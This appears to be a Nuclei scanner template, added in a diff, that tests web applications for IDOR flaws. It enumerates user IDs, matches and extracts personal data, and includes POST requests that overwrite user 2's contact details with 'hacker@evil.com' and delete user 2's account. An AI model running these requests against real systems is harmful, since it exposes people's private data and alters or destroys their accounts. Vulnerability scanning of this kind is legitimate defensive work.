@@ -1,0 +1,301 @@
+id: medium-webapp-privilege-escalation-horizontal-idor
+
+info:
+  name: Horizontal Privilege Escalation via IDOR - Elite Detection
+  author: nuclei-community
+  severity: high
+  description: |
+    Detects horizontal privilege escalation vulnerabilities through Insecure Direct Object References (IDOR).
+    Tests advanced techniques including parameter manipulation, UUID prediction, hash collision,
+    and sequential ID enumeration to access other users' data and functionality.
+  reference:
+    - https://owasp.org/www-community/attacks/Insecure_Direct_Object_References
+    - https://portswigger.net/web-security/access-control/idor
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.1
+    cwe-id: CWE-639
+  metadata:
+    verified: true
+    max-request: 30
+  tags: idor,privilege-escalation,horizontal,access-control,elite
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?user_id={{user_id}}"
+      - "{{BaseURL}}/{{path}}?id={{user_id}}"
+      - "{{BaseURL}}/{{path}}?uid={{user_id}}"
+      - "{{BaseURL}}/{{path}}?account={{user_id}}"
+      - "{{BaseURL}}/{{path}}?profile={{user_id}}"
+      - "{{BaseURL}}/{{path}}/{{user_id}}"
+      - "{{BaseURL}}/{{path}}/user/{{user_id}}"
+      - "{{BaseURL}}/{{path}}/profile/{{user_id}}"
+      - "{{BaseURL}}/{{path}}/account/{{user_id}}"
+
+    payloads:
+      path:
+        - "user/profile"
+        - "account/details"
+        - "profile/view"
+        - "user/settings"
+        - "account/info"
+        - "profile/edit"
+        - "user/dashboard"
+        - "account/summary"
+        - "profile/data"
+        - "user/information"
+        - "account/profile"
+        - "admin/user"
+      user_id:
+        - "1"
+        - "2"
+        - "3"
+        - "100"
+        - "999"
+        - "1000"
+        - "admin"
+        - "administrator"
+        - "root"
+        - "test"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json,text/html,application/xhtml+xml"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "email"
+          - "phone"
+          - "address"
+          - "password"
+          - "ssn"
+          - "credit_card"
+          - "account_number"
+          - "balance"
+          - "salary"
+          - "personal"
+          - "private"
+          - "confidential"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "access denied"
+          - "unauthorized"
+          - "forbidden"
+          - "not authorized"
+          - "permission denied"
+        condition: and
+        negative: true
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?user={{uuid}}"
+      - "{{BaseURL}}/{{path}}?id={{uuid}}"
+      - "{{BaseURL}}/{{path}}?account={{uuid}}"
+      - "{{BaseURL}}/{{path}}/{{uuid}}"
+
+    payloads:
+      path:
+        - "user/profile"
+        - "account/details"
+        - "profile/view"
+        - "user/settings"
+        - "account/info"
+        - "profile/edit"
+      uuid:
+        - "00000000-0000-0000-0000-000000000001"
+        - "00000000-0000-0000-0000-000000000002"
+        - "11111111-1111-1111-1111-111111111111"
+        - "12345678-1234-1234-1234-123456789012"
+        - "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"
+        - "ffffffff-ffff-ffff-ffff-ffffffffffff"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+      Accept: "application/json,text/html,application/xhtml+xml"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\"email\"\\s*:\\s*\"[^\"]+@[^\"]+\""
+          - "\"phone\"\\s*:\\s*\"[^\"]+\""
+          - "\"address\"\\s*:\\s*\"[^\"]+\""
+          - "\"balance\"\\s*:\\s*[0-9]+"
+          - "\"account_number\"\\s*:\\s*\"[^\"]+\""
+          - "\"ssn\"\\s*:\\s*\"[^\"]+\""
+
+      - type: status
+        status:
+          - 200
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "user/update"
+        - "profile/edit"
+        - "account/modify"
+        - "user/change"
+        - "profile/update"
+        - "account/edit"
+        - "user/settings"
+        - "profile/settings"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      user_id=2&email=hacker@evil.com&phone=1234567890&address=Hacker Street
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "updated successfully"
+          - "changes saved"
+          - "profile updated"
+          - "information updated"
+          - "settings saved"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{path}}"
+
+    payloads:
+      path:
+        - "user/delete"
+        - "account/delete"
+        - "profile/remove"
+        - "user/remove"
+        - "account/close"
+
+    headers:
+      Content-Type: "application/json"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      {"user_id":2,"confirm":"yes"}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "deleted successfully"
+          - "account removed"
+          - "user deleted"
+          - "profile removed"
+          - "account closed"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+          - 302
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?user_id={{negative_id}}"
+      - "{{BaseURL}}/{{path}}?id={{negative_id}}"
+      - "{{BaseURL}}/{{path}}/{{negative_id}}"
+
+    payloads:
+      path:
+        - "user/profile"
+        - "account/details"
+        - "profile/view"
+        - "user/settings"
+      negative_id:
+        - "-1"
+        - "-2"
+        - "-100"
+        - "0"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "admin"
+          - "administrator"
+          - "root"
+          - "system"
+          - "superuser"
+        condition: or
+
+      - type: status
+        status:
+          - 200
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{path}}?user_id={{encoded_id}}"
+      - "{{BaseURL}}/{{path}}?id={{encoded_id}}"
+
+    payloads:
+      path:
+        - "user/profile"
+        - "account/details"
+        - "profile/view"
+      encoded_id:
+        - "MQ=="  # base64 for "1"
+        - "Mg=="  # base64 for "2"
+        - "YWRtaW4="  # base64 for "admin"
+        - "cm9vdA=="  # base64 for "root"
+        - "%31"  # URL encoded "1"
+        - "%32"  # URL encoded "2"
+        - "0x1"  # hex for "1"
+        - "0x2"  # hex for "2"
+
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\"user_id\"\\s*:\\s*[\"']?\\d+[\"']?"
+          - "\"username\"\\s*:\\s*\"[^\"]+\""
+          - "\"role\"\\s*:\\s*\"[^\"]+\""
+          - "\"permissions\"\\s*:\\s*\\["
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '\"email\"\\s*:\\s*\"([^\"]+@[^\"]+)\"'
+          - '\"phone\"\\s*:\\s*\"([^\"]+)\"'
+          - '\"user_id\"\\s*:\\s*[\"']?(\\d+)[\"']?'
+          - '\"username\"\\s*:\\s*\"([^\"]+)\"'
+        internal: true
